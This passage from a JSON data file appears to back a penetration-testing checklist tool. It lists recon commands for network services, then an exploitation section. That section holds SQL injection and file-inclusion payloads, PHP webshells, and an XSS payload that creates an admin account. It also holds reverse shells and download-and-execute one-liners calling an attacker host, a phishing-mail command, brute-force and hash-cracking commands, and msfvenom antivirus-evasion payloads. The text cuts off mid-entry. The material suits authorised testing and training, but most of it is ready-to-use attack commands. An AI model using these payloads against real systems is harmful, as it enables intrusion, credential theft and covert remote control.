              "snmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2",
              "snmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.2.1.6.13.1.3"
            ]
          }
        ]
      },
      {
        "id": "recon-13",
        "name": "LDAP / Global Catalog Enumeration (389/636/3268/3269)",
        "description": "Anonymous and authenticated LDAP enumeration, record extraction, and domain component queries.",
        "commands": [
          {
            "desc": "Anonymous LDAP enumeration with auto-derived base DN",
            "subdesc": "",
            "cmd": [
              "target_domain='domain.tld'",
              "target_hostname=\"DC01.${target_domain}\"",
              "domain_component=$(echo $target_domain | tr '.' '\\n' | xargs -I % echo \"DC=%\" | paste -sd, -)",
              "ldapsearch -x -H ldap://$target_hostname -b $domain_component"
            ]
          },
          {
            "desc": "Alternative anonymous LDAP queries",
            "subdesc": "",
            "cmd": [
              "ldapsearch -x -h <TARGET_IP> -s base namingcontexts",
              "ldapsearch -x -h <TARGET_IP> -s sub -b 'DC=domain,DC=tld'"
            ]
          },
          {
            "desc": "Authenticated LDAP search and full object dump",
            "subdesc": "",
            "cmd": [
              "ldapsearch -x -H ldap://<TARGET_IP> -D '<DOMAIN>\\<USER>' -w '<PASS>' -b 'DC=domain,DC=tld' sAMAccountName",
              "ldapsearch -x -H ldap://<TARGET_IP> -b $domain_component 'objectClass=*'"
            ]
          }
        ]
      },
      {
        "id": "recon-14",
        "name": "MSSQL Enumeration (1433)",
        "description": "MSSQL nmap scripts, impacket client, database queries, xp_cmdshell RCE, and xp_dirtree NTLM capture.",
        "commands": [
          {
            "desc": "MSSQL enumeration using nmap scripts",
            "subdesc": "",
            "cmd": [
              "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET_IP>"
            ]
          },
          {
            "desc": "Connect with impacket MSSQL client",
            "subdesc": "",
            "cmd": [
              "impacket-mssqlclient Administrator:Pass@<TARGET_IP> -windows-auth",
              "impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET_IP>"
            ]
          },
          {
            "desc": "Basic database queries",
            "subdesc": "",
            "cmd": [
              "select @@version;",
              "SELECT name from sys.databases;",
              "USE <database-name>;",
              "SELECT * FROM <database>.INFORMATION_SCHEMA.TABLES;",
              "SELECT * FROM <database>.dbo.<table>;"
            ]
          },
          {
            "desc": "Enable and use xp_cmdshell for OS command execution",
            "subdesc": "",
            "cmd": [
              "enable_xp_cmdshell",
              "EXEC sp_configure 'show advanced options', 1;",
              "RECONFIGURE;",
              "EXEC sp_configure 'xp_cmdshell', 1;",
              "RECONFIGURE;",
              "EXEC xp_cmdshell \"whoami\""
            ]
          },
          {
            "desc": "Force NTLM authentication capture with xp_dirtree",
            "subdesc": "",
            "cmd": [
              "EXEC xp_dirtree '\\\\<LHOST>\\share'"
            ]
          }
        ]
      },
      {
        "id": "recon-15",
        "name": "MySQL Enumeration (3306)",
        "description": "MySQL login, version check, database listing, and data extraction.",
        "commands": [
          {
            "desc": "Login to MySQL server",
            "subdesc": "",
            "cmd": [
              "mysql -u <username> -p <password> -h <TARGET_IP> -P 3306 --skip-ssl-verify-server-cert"
            ]
          },
          {
            "desc": "Check version, current user, list databases, and query tables",
            "subdesc": "",
            "cmd": [
              "select version();",
              "select system_user();",
              "show databases;",
              "use <database-name>;",
              "select * from <table> \\G"
            ]
          }
        ]
      },
      {
        "id": "recon-16",
        "name": "RDP Enumeration (3389)",
        "description": "RDP encryption enumeration and vulnerability checks (MS12-020).",
        "commands": [
          {
            "desc": "Enumerate RDP encryption, vulnerabilities, and NTLM info",
            "subdesc": "",
            "cmd": [
              "nmap --script \"rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\" -p 3389 -T4 <TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "recon-17",
        "name": "WinRM Check (5985/5986)",
        "description": "Validate WinRM access with known credentials.",
        "commands": [
          {
            "desc": "Connect to WinRM with evil-winrm",
            "subdesc": "",
            "cmd": [
              "evil-winrm -i <TARGET_IP> -u <USER> -p <PASS>"
            ]
          }
        ]
      },
      {
        "id": "recon-18",
        "name": "Finger Enumeration (79)",
        "description": "Enumerate users via Finger protocol using manual queries and automated scripts.",
        "commands": [
          {
            "desc": "Basic user enumeration via Finger",
            "subdesc": "",
            "cmd": [
              "finger @<TARGET_IP>",
              "finger admin@<TARGET_IP>"
            ]
          },
          {
            "desc": "Automated user enumeration with finger-user-enum.pl",
            "subdesc": "",
            "cmd": [
              "finger-user-enum.pl -U users.txt -t <TARGET_IP>",
              "finger-user-enum.pl -u root -t <TARGET_IP>"
            ]
          },
          {
            "desc": "Enumerate against a full wordlist and filter results",
            "subdesc": "",
            "cmd": [
              "perl finger-user-enum.pl -t <TARGET_IP> -U /usr/share/wordlists/seclists/Usernames/Names/names.txt | grep -win \"Login\""
            ]
          }
        ]
      },
      {
        "id": "recon-19",
        "name": "Kerberos Enumeration (88)",
        "description": "Enumerate Kerberos users with nmap and kerbrute, and extract SPNs with credentials.",
        "commands": [
          {
            "desc": "Enumerate Kerberos users with nmap krb5-enum-users",
            "subdesc": "",
            "cmd": [
              "nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=\"/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt\" <TARGET_IP>"
            ]
          },
          {
            "desc": "Enumerate Kerberos users with Kerbrute",
            "subdesc": "",
            "cmd": [
              "./kerbrute userenum --dc <TARGET_IP> -d <DOMAIN> /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
            ]
          },
          {
            "desc": "Extract SPNs (requires valid credentials)",
            "subdesc": "",
            "cmd": [
              "GetUserSPNs.py -request -dc-ip <TARGET_IP> <DOMAIN>/<USER>"
            ]
          }
        ]
      },
      {
        "id": "recon-20",
        "name": "MSRPC Enumeration (135)",
        "description": "MSRPC null auth, domain user/group enumeration, and RPC command reference.",
        "commands": [
          {
            "desc": "MSRPC enumeration with nmap and rpcclient null/empty auth",
            "subdesc": "",
            "cmd": [
              "nmap -A -sV -sC -Pn --script=msrpc-enum <TARGET_IP> -p135",
              "rpcclient <TARGET_IP> -N",
              "rpcclient -U \"%\" <TARGET_IP>"
            ]
          },
          {
            "desc": "Enumerate domain users and groups inside rpcclient",
            "subdesc": "",
            "cmd": [
              "enumdomusers",
              "querydispinfo",
              "queryuser <RID>",
              "enumprinters",
              "enumdomgroups",
              "querygroup <RID>",
              "querygroupmem <RID>"
            ]
          },
          {
            "desc": "Change a user's password via RPC",
            "subdesc": "",
            "cmd": [
              "setuserinfo2 <username> 23 <password>"
            ]
          }
        ]
      },
      {
        "id": "recon-21",
        "name": "IMAP/IMAPS Enumeration (143/993)",
        "description": "IMAP NTLM enumeration, mailbox login, message retrieval, and phishing email delivery.",
        "commands": [
          {
            "desc": "Enumerate IMAP NTLM info with nmap",
            "subdesc": "",
            "cmd": [
              "nmap -p 143 --script imap-ntlm-info.nse <TARGET_IP>"
            ]
          },
          {
            "desc": "Connect and interact with mailbox via IMAP commands",
            "subdesc": "After connecting with nc, run the following IMAP tag commands:",
            "cmd": [
              "nc <TARGET_IP> 143",
              "tag login USER@localhost PASSWORD",
              "tag LIST \"\" \"*\"",
              "tag SELECT INBOX",
              "tag STATUS INBOX (MESSAGES)",
              "tag fetch <num-of-messages> BODY[HEADER] BODY[1]"
            ]
          },
          {
            "desc": "Deliver phishing email with attachment via SWAKS",
            "subdesc": "",
            "cmd": [
              "swaks --to target@domain --from jonas@domain --attach @file.ods --server <TARGET_IP> --body \"Please check this out\" --header \"Subject: IMPORTANT UPDATE\""
            ]
          }
        ]
      },
      {
        "id": "recon-22",
        "name": "POP3/POP3S Enumeration (110/995)",
        "description": "POP3 service and auth method checks.",
        "commands": [
          {
            "desc": "Enumerate POP3 capabilities and NTLM auth info",
            "subdesc": "",
            "cmd": [
              "nmap --script pop3-capabilities,pop3-ntlm-info -p110,995 <TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "recon-23",
        "name": "NFS / rpcbind Enumeration (111/2049)",
        "description": "Enumerate NFS exports and mount remote shares locally.",
        "commands": [
          {
            "desc": "List NFS exports on the target",
            "subdesc": "",
            "cmd": [
              "showmount -e <TARGET_IP>"
            ]
          },
          {
            "desc": "Mount the NFS share locally",
            "subdesc": "",
            "cmd": [
              "mkdir nfstarget",
              "sudo mount -t nfs <TARGET_IP>:/mnt/backups/ nfstarget -o nolock"
            ]
          }
        ]
      },
      {
        "id": "recon-24",
        "name": "PostgreSQL Enumeration (5432)",
        "description": "PostgreSQL login, database listing, table enumeration, and data extraction.",
        "commands": [
          {
            "desc": "Login to PostgreSQL server",
            "subdesc": "",
            "cmd": [
              "psql -h <TARGET_IP> -p 5432 -U <username>"
            ]
          },
          {
            "desc": "List databases, connect, enumerate tables, and query data",
            "subdesc": "",
            "cmd": [
              "\\x on",
              "\\l;",
              "\\c <database>;",
              "\\dt;",
              "SELECT * FROM \"TABLE-NAME\";"
            ]
          }
        ]
      },
      {
        "id": "recon-25",
        "name": "Oracle TNS Enumeration (1521)",
        "description": "Oracle listener version detection and SID discovery.",
        "commands": [
          {
            "desc": "Detect Oracle TNS listener version",
            "subdesc": "",
            "cmd": [
              "nmap --script oracle-tns-version -p1521 <TARGET_IP>"
            ]
          },
          {
            "desc": "Guess Oracle SIDs with ODAT",
            "subdesc": "",
            "cmd": [
              "odat sidguesser -s <TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "recon-26",
        "name": "Redis Enumeration (6379)",
        "description": "Redis unauthenticated exposure and configuration checks.",
        "commands": [
          {
            "desc": "Retrieve Redis server info via CLI",
            "subdesc": "",
            "cmd": [
              "redis-cli -h <TARGET_IP> -p 6379 INFO"
            ]
          },
          {
            "desc": "Enumerate Redis with nmap info script",
            "subdesc": "",
            "cmd": [
              "nmap --script redis-info -p6379 <TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "recon-27",
        "name": "MongoDB Enumeration (27017)",
        "description": "MongoDB unauthenticated access and database discovery.",
        "commands": [
          {
            "desc": "Connect to MongoDB shell",
            "subdesc": "",
            "cmd": [
              "mongo --host <TARGET_IP> --port 27017"
            ]
          },
          {
            "desc": "Enumerate MongoDB with nmap scripts",
            "subdesc": "",
            "cmd": [
              "nmap --script mongodb-info,mongodb-databases -p27017 <TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "recon-28",
        "name": "Elasticsearch Enumeration (9200)",
        "description": "Index exposure and REST API checks on Elasticsearch.",
        "commands": [
          {
            "desc": "List all Elasticsearch indices via API",
            "subdesc": "",
            "cmd": [
              "curl -s http://<TARGET_IP>:9200/_cat/indices?v"
            ]
          },
          {
            "desc": "HTTP enum scan on Elasticsearch port",
            "subdesc": "",
            "cmd": [
              "nmap --script http-enum -p9200 <TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "recon-29",
        "name": "Memcached Enumeration (11211)",
        "description": "Memcached information leakage checks.",
        "commands": [
          {
            "desc": "Retrieve Memcached server stats via netcat",
            "subdesc": "",
            "cmd": [
              "echo stats | nc <TARGET_IP> 11211"
            ]
          },
          {
            "desc": "Enumerate Memcached with nmap info script",
            "subdesc": "",
            "cmd": [
              "nmap --script memcached-info -p11211 <TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "recon-30",
        "name": "VNC Enumeration (5900)",
        "description": "VNC auth mechanism and display info checks.",
        "commands": [
          {
            "desc": "Enumerate VNC info and display title with nmap",
            "subdesc": "",
            "cmd": [
              "nmap --script vnc-info,vnc-title -p5900 <TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "recon-31",
        "name": "Vulnerability Scan (Nmap NSE)",
        "description": "Run NSE vulnerability scripts against all discovered open ports.",
        "commands": [
          {
            "desc": "Run NSE vuln scripts against open ports",
            "subdesc": "",
            "cmd": [
              "nmap --script vuln -p<OPEN_PORTS> <TARGET_IP>"
            ]
          }
        ]
      }
    ]
  },

  /* ─── Phase 3: Exploitation ──────────────────────────────────── */
  {
    "id": "exploitation",
    "name": "Exploitation",
    "optional": false,
    "items": [
      {
        "id": "exploit-1",
        "name": "Exploit Lookup",
        "description": "Map services to known exploits via searchsploit, exploit-db, and Google.",
        "commands": [
          {
            "desc": "Using Searchsploit",
            "subdesc": "",
            "cmd": [
              "searchsploit <SERVICE/VERSION>"
            ]
          },
          {
            "desc": "Using SICAT exploit finder [https://github.com/justakazh/sicat]",
            "subdesc": "Search for vulnerabilities and exploits from multiple high-profile sources (ExploitDB, NVD NIST, CVE.org, Github)",
            "cmd": [
              "sicat -k <SERVICE/VERSION>"
            ]
          }
        ]
      },
      {
        "id": "exploit-18",
        "name": "SQL Injection",
        "description": "Authentication bypass, UNION extraction, blind/time-based injection, and SQLmap automation.",
        "commands": [
          {
            "desc": "Basic Tests",
            "subdesc": "",
            "cmd": [
              "'",
              "' OR 1=1-- -",
              "' OR 1=1#",
              "\" OR 1=1#",
              "'OR '' = '"
            ]
          },
          {
            "desc": "Enumerate Columns",
            "subdesc": "",
            "cmd": [
              "' ORDER BY 1-- //",
              "' UNION SELECT NULL,NULL,NULL--"
            ]
          },
          {
            "desc": "UNION Data Extraction",
            "subdesc": "",
            "cmd": [
              "' UNION SELECT database(), user(), @@version, null, null -- //",
              "' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //",
              "' UNION SELECT null, username, password, description, null FROM users -- //"
            ]
          },
          {
            "desc": "UNION Webshell",
            "subdesc": "",
            "cmd": [
              "' UNION SELECT \"<?php system($_GET['cmd']);?>\", null INTO OUTFILE \"/var/www/html/tmp/webshell.php\" -- //",
              "<TARGET>/tmp/webshell.php?cmd=id"
            ]
          },
          {
            "desc": "Blind Boolean",
            "subdesc": "",
            "cmd": [
              "' AND (SELECT 'a' FROM users LIMIT 1)='a",
              "' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)>'m"
            ]
          },
          {
            "desc": "Time-Based Blind",
            "subdesc": "",
            "cmd": [
              "' IF (1=1) WAITFOR DELAY '0:0:10';--",
              "'||pg_sleep(10)--"
            ]
          },
          {
            "desc": "SQLmap",
            "subdesc": "",
            "cmd": [
              "sqlmap -u \"http://<TARGET_IP>/page?id=1\" -p id --dbs --batch",
              "sqlmap -u \"http://<TARGET_IP>/page?id=1\" -p id --dump",
              "sqlmap -r request.txt -p <PARAM> --os-shell --web-root \"/var/www/html/tmp\""
            ]
          }
        ]
      },
      {
        "id": "exploit-19",
        "name": "Local File Inclusion (LFI)",
        "description": "Path traversal, PHP wrappers (filter, data, zip), log poisoning, and encoding bypasses.",
        "commands": [
          {
            "desc": "Directory Traversal",
            "subdesc": "",
            "cmd": [
              "../../../etc/passwd",
              "....//....//....//etc/passwd",
              "..%252f..%252f..%252fetc%252fpasswd"
            ]
          },
          {
            "desc": "Null Byte (PHP <5.3)",
            "subdesc": "",
            "cmd": [
              "../../../etc/passwd%00"
            ]
          },
          {
            "desc": "URL Encoding Bypass",
            "subdesc": "",
            "cmd": [
              "/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
            ]
          },
          {
            "desc": "PHP Filter (read source)",
            "subdesc": "",
            "cmd": [
              "php://filter/convert.base64-encode/resource=index.php"
            ]
          },
          {
            "desc": "PHP Data Wrapper (RCE)",
            "subdesc": "",
            "cmd": [
              "data://text/plain,<?php echo system('ls');?>",
              "echo -n '<?php echo system($_GET[\"cmd\"]);?>' | base64",
              "data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
            ]
          },
          {
            "desc": "PHP ZIP Wrapper",
            "subdesc": "",
            "cmd": [
              "echo '<?php system($_GET[\"cmd\"]); ?>' > payload.php",
              "zip payload.zip payload.php; mv payload.zip shell.jpg",
              "zip://shell.jpg%23payload.php"
            ]
          },
          {
            "desc": "Log Poisoning (Apache)",
            "subdesc": "Inject <?php system($_GET['cmd']); ?> in User-Agent via Burp, then include the log file",
            "cmd": [
              "<TARGET>/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami"
            ]
          },
          {
            "desc": "Key Files",
            "subdesc": "",
            "cmd": [
              "/etc/passwd",
              "/home/<user>/.ssh/id_rsa"
            ]
          }
        ]
      },
      {
        "id": "exploit-20",
        "name": "Remote File Inclusion (RFI)",
        "description": "Remote file inclusion via HTTP/SMB. Requires allow_url_include enabled.",
        "commands": [
          {
            "desc": "Basic RFI",
            "subdesc": "",
            "cmd": [
              "http://<TARGET>/index.php?page=http://<LHOST>/shell.php",
              "http://<TARGET>/index.php?page=\\\\<LHOST>\\shell.php"
            ]
          },
          {
            "desc": "Attacker Setup",
            "subdesc": "Kali webshells: /usr/share/webshells/php/",
            "cmd": [
              "python3 -m http.server 80"
            ]
          },
          {
            "desc": "curl RFI",
            "subdesc": "",
            "cmd": [
              "curl \"http://<TARGET>/index.php?page=http://<LHOST>/simple-backdoor.php&cmd=ls\""
            ]
          }
        ]
      },
      {
        "id": "exploit-21",
        "name": "Command Injection",
        "description": "OS command injection operators, CMD/PS detection, and reverse shell delivery via powercat.",
        "commands": [
          {
            "desc": "Injection Operators",
            "subdesc": "",
            "cmd": [
              "; id",
              "| id",
              "$(id)",
              "`id`",
              "&& id",
              "|| id"
            ]
          },
          {
            "desc": "curl POST Test",
            "subdesc": "",
            "cmd": [
              "curl -X POST --data 'param=value%3Bid' http://<TARGET>:<PORT>/endpoint"
            ]
          },
          {
            "desc": "CMD vs PowerShell Detect",
            "subdesc": "",
            "cmd": [
              "(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell"
            ]
          },
          {
            "desc": "Reverse Shell via Injection",
            "subdesc": "Deliver powercat and catch shell",
            "cmd": [
              "cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .",
              "python3 -m http.server 80",
              "nc -lvnp <LPORT>",
              "# Inject:",
              "IEX (New-Object System.Net.Webclient).DownloadString(\"http://<LHOST>/powercat.ps1\");powercat -c <LHOST> -p <LPORT> -e powershell"
            ]
          },
          {
            "desc": "Bypass Spaces",
            "subdesc": "",
            "cmd": [
              "%20",
              "${IFS}"
            ]
          }
        ]
      },
      {
        "id": "exploit-22",
        "name": "File Upload Bypass",
        "description": "Extension bypasses, null bytes, .htaccess override, RTLO trick, and directory traversal upload.",
        "commands": [
          {
            "desc": "Alt Extensions",
            "subdesc": "",
            "cmd": [
              ".phps .php7 .phtml .pht .phar {UPPERCASE}"
            ]
          },
          {
            "desc": "Null Byte / Double Extension",
            "subdesc": "",
            "cmd": [
              "file.php%00.jpg",
              "file.jpg.php"
            ]
          },
          {
            "desc": "NTFS Tricks",
            "subdesc": "",
            "cmd": [
              "file.php......    # trailing dots",
              "file.php%20       # trailing space"
            ]
          },
          {
            "desc": ".htaccess Override",
            "subdesc": "",
            "cmd": [
              "echo \"AddType application/x-httpd-php .dork\" > .htaccess",
              "# Upload shell as shell.dork"
            ]
          },
          {
            "desc": "RTLO Trick",
            "subdesc": "",
            "cmd": [
              "name.%E2%80%AEphp.jpg > name.gpj.php"
            ]
          },
          {
            "desc": "SSH Key via Dir Traversal",
            "subdesc": "Upload your id_rsa.pub content",
            "cmd": [
              "# filename: ../../../../root/.ssh/authorized_keys"
            ]
          }
        ]
      },
      {
        "id": "exploit-xss",
        "name": "Cross-Site Scripting (XSS)",
        "description": "Reflected, stored, and DOM-based XSS testing with WAF bypass techniques.",
        "commands": [
          {
            "desc": "Test Characters",
            "subdesc": "",
            "cmd": [
              "< > ' \" { } ;"
            ]
          },
          {
            "desc": "Reflected XSS",
            "subdesc": "",
            "cmd": [
              "<script>alert('XSS')</script>",
              "<img src=x onerror=alert('XSS')>",
              "<svg onload=alert('XSS')>"
            ]
          },
          {
            "desc": "Stored XSS – Privilege Escalation",
            "subdesc": "Inject JS to create admin user (e.g., WordPress)",
            "cmd": [
              "<script>var ajaxRequest=new XMLHttpRequest();var url=\"/wp-admin/user-new.php\";var usr=\"hacker\";var passwd=\"hacker123\";ajaxRequest.open(\"POST\",url,true);ajaxRequest.send(\"action=createuser&_wpnonce_create-user=\"+nonce+\"&user_login=\"+usr+\"&email=hacker@hacker.com&pass1=\"+passwd+\"&pass1-text=\"+passwd+\"&pass2=\"+passwd+\"&role=administrator\");</script>"
            ]
          },
          {
            "desc": "WAF Bypass & Encoding",
            "subdesc": "Use charCodeAt + fromCharCode or base64 to encode payloads",
            "cmd": [
              "curl -i http://<TARGET> --data-urlencode \"param=<script>alert(1)</script>\""
            ]
          }
        ]
      },
      {
        "id": "exploit-cms",
        "name": "Content Management Systems",
        "description": "WordPress wpscan, theme editor RCE, Drupal droopescan, and Joomla joomscan.",
        "commands": [
          {
            "desc": "WordPress: Enumeration",
            "subdesc": "",
            "cmd": [
              "wpscan --url http://<TARGET> --enumerate vp,vt,dbe"
            ]
          },
          {
            "desc": "WordPress: Brute Force",
            "subdesc": "",
            "cmd": [
              "wpscan --url http://<TARGET> -U users.txt -P /usr/share/wordlists/rockyou.txt"
            ]
          },
          {
            "desc": "WordPress: Theme Editor RCE",
            "subdesc": "Appearance > Theme Editor > 404.php",
            "cmd": [
              "# Inject into 404.php:",
              "<?php system($_GET['cmd']); ?>",
              "",
              "# Access:",
              "/wp-content/themes/<theme>/404.php?cmd=id"
            ]
          },
          {
            "desc": "Drupal",
            "subdesc": "",
            "cmd": [
              "droopescan scan drupal -u http://<TARGET>"
            ]
          },
          {
            "desc": "Joomla",
            "subdesc": "",
            "cmd": [
              "joomscan -u http://<TARGET>"
            ]
          }
        ]
      },
      {
        "id": "exploit-webshells",
        "name": "Web Shells",
        "description": "PHP webshell one-liners, MySQL OUTFILE shells, and Kali built-in webshells.",
        "commands": [
          {
            "desc": "PHP One-Liners",
            "subdesc": "",
            "cmd": [
              "<?php echo system($_GET['cmd']); ?>",
              "<?php echo exec($_GET['cmd']); ?>",
              "<?php echo passthru($_GET['cmd']); ?>"
            ]
          },
          {
            "desc": "Minimal",
            "subdesc": "",
            "cmd": [
              "<?php system($_REQUEST['c']); ?>"
            ]
          },
          {
            "desc": "MySQL INTO OUTFILE Webshell",
            "subdesc": "",
            "cmd": [
              "SELECT \"<?php if(isset($_GET['cmd'])) { system($_GET['cmd'] . ' 2>&1'); } ?>\" INTO OUTFILE \"C:/wamp/www/webshell.php\";"
            ]
          },
          {
            "desc": "Kali Webshells",
            "subdesc": "",
            "cmd": [
              "/usr/share/webshells/php/"
            ]
          }
        ]
      },
      {
        "id": "exploit-23",
        "name": "Reverse Shell (Setup Listener)",
        "description": "Netcat, rlwrap, and Metasploit multi/handler listeners.",
        "commands": [
          {
            "desc": "Netcat Listener",
            "subdesc": "",
            "cmd": [
              "nc -lvnp <LPORT>"
            ]
          },
          {
            "desc": "Wrapped Listener (Windows targets)",
            "subdesc": "",
            "cmd": [
              "rlwrap nc -lvnp <LPORT>"
            ]
          },
          {
            "desc": "Metasploit Multi/Handler",
            "subdesc": "",
            "cmd": [
              "msfconsole -q",
              "use exploit/multi/handler",
              "set PAYLOAD <payload>",
              "set LHOST 0.0.0.0",
              "set LPORT <LPORT>",
              "run"
            ]
          }
        ]
      },
      {
        "id": "exploit-24",
        "name": "Reverse Shell Payloads",
        "description": "Bash, Python, PowerShell (powercat, Nishang) reverse shell payloads.",
        "commands": [
          {
            "desc": "linux: Bash",
            "subdesc": "",
            "cmd": [
              "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
            ]
          },
          {
            "desc": "linux: Python",
            "subdesc": "",
            "cmd": [
              "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
            ]
          },
          {
            "desc": "windows: PowerShell (powercat)",
            "subdesc": "",
            "cmd": [
              "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e cmd"
            ]
          },
          {
            "desc": "windows: PowerShell (Nishang)",
            "subdesc": "",
            "cmd": [
              "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>\""
            ]
          },
          {
            "desc": "windows: PowerShell Download & Exec",
            "subdesc": "",
            "cmd": [
              "powershell -c 'IEX(IWR http://<LHOST>/revshell.ps1 -UseBasicParsing)'"
            ]
          }
        ]
      },
      {
        "id": "exploit-25",
        "name": "Shell Upgrade / Stabilize",
        "description": "Python PTY spawn, stty raw, script method, and terminal size fix.",
        "commands": [
          {
            "desc": "Python PTY",
            "subdesc": "",
            "cmd": [
              "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
              "export TERM=xterm"
            ]
          },
          {
            "desc": "Background & Raw Mode",
            "subdesc": "Ctrl+Z then:",
            "cmd": [
              "stty raw -echo; fg"
            ]
          },
          {
            "desc": "Fix Terminal Size",
            "subdesc": "",
            "cmd": [
              "stty rows 38 columns 116"
            ]
          },
          {
            "desc": "Script Method",
            "subdesc": "",
            "cmd": [
              "script -qc /bin/bash /dev/null"
            ]
          },
          {
            "desc": "Wrapped Listener (before catching)",
            "subdesc": "",
            "cmd": [
              "rlwrap nc -lvnp <LPORT>"
            ]
          }
        ]
      },
      {
        "id": "exploit-26",
        "name": "Password Brute Force",
        "description": "Hydra brute force for SSH, RDP, HTTP forms, FTP, and SMB.",
        "commands": [
          {
            "desc": "SSH",
            "subdesc": "",
            "cmd": [
              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>"
            ]
          },
          {
            "desc": "RDP",
            "subdesc": "",
            "cmd": [
              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt rdp://<TARGET_IP>"
            ]
          },
          {
            "desc": "HTTP POST Form",
            "subdesc": "",
            "cmd": [
              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form \"/login:username=^USER^&password=^PASS^:F=incorrect\""
            ]
          },
          {
            "desc": "HTTP GET (Basic Auth)",
            "subdesc": "",
            "cmd": [
              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-get /protected"
            ]
          },
          {
            "desc": "FTP",
            "subdesc": "",
            "cmd": [
              "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>"
            ]
          },
          {
            "desc": "SMB",
            "subdesc": "",
            "cmd": [
              "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://<TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "exploit-27",
        "name": "Hash Cracking",
        "description": "Hash identification, Hashcat modes/rules, John the Ripper, and unshadow.",
        "commands": [
          {
            "desc": "Identify Hash Type",
            "subdesc": "",
            "cmd": [
              "hashid -m <HASH>",
              "hash-identifier"
            ]
          },
          {
            "desc": "Hashcat",
            "subdesc": "Common modes: 0=MD5, 100=SHA1, 1400=SHA256, 1800=sha512crypt, 3200=bcrypt, 1000=NTLM, 5600=NetNTLMv2",
            "cmd": [
              "hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt",
              "hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
            ]
          },
          {
            "desc": "John the Ripper",
            "subdesc": "",
            "cmd": [
              "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
              "john --show hash.txt"
            ]
          },
          {
            "desc": "Unshadow (Linux)",
            "subdesc": "",
            "cmd": [
              "unshadow passwd shadow > unshadowed.txt",
              "john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt"
            ]
          }
        ]
      },
      {
        "id": "exploit-28",
        "name": "File Transfer to Target",
        "description": "Python HTTP server, impacket-smbserver, certutil, PowerShell IWR, curl, wget, scp, and FTP.",
        "commands": [
          {
            "desc": "Attacker: Serve Files",
            "subdesc": "",
            "cmd": [
              "python3 -m http.server 80",
              "impacket-smbserver share . -smb2support"
            ]
          },
          {
            "desc": "linux: Download",
            "subdesc": "",
            "cmd": [
              "wget http://<LHOST>/file -O /tmp/file",
              "curl http://<LHOST>/file -o /tmp/file",
              "scp <USER>@<LHOST>:file /tmp/file",
              "bash -c 'cat < /dev/tcp/<LHOST>/80 > file'"
            ]
          },
          {
            "desc": "windows: Download",
            "subdesc": "",
            "cmd": [
              "certutil -urlcache -f http://<LHOST>/file.exe file.exe",
              "powershell -c \"IWR -uri http://<LHOST>/file.exe -Outfile file.exe\"",
              "copy \\\\<LHOST>\\share\\file.exe ."
            ]
          },
          {
            "desc": "FTP (anonymous)",
            "subdesc": "",
            "cmd": [
              "ftp -n <LHOST>",
              "# USER anonymous / PASS anonymous",
              "# get file.exe"
            ]
          }
        ]
      },
      {
        "id": "exploit-av-evasion",
        "name": "AV Evasion",
        "description": "msfvenom encoding, Shellter, Veil, Donut, PS obfuscation, UPX packing, and Defender bypass.",
        "commands": [
          {
            "desc": "msfvenom Encoding",
            "subdesc": "",
            "cmd": [
              "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe"
            ]
          },
          {
            "desc": "Shellter",
            "subdesc": "Run in wine on Kali. Auto mode > PE target (legit .exe) > L for listed payloads or C for custom",
            "cmd": [
              "shellter"
            ]
          },
          {
            "desc": "Veil Framework",
            "subdesc": "use 1 > list > use <payload_number> > set LHOST/LPORT > generate",
            "cmd": [
              "veil"
            ]
          },
          {
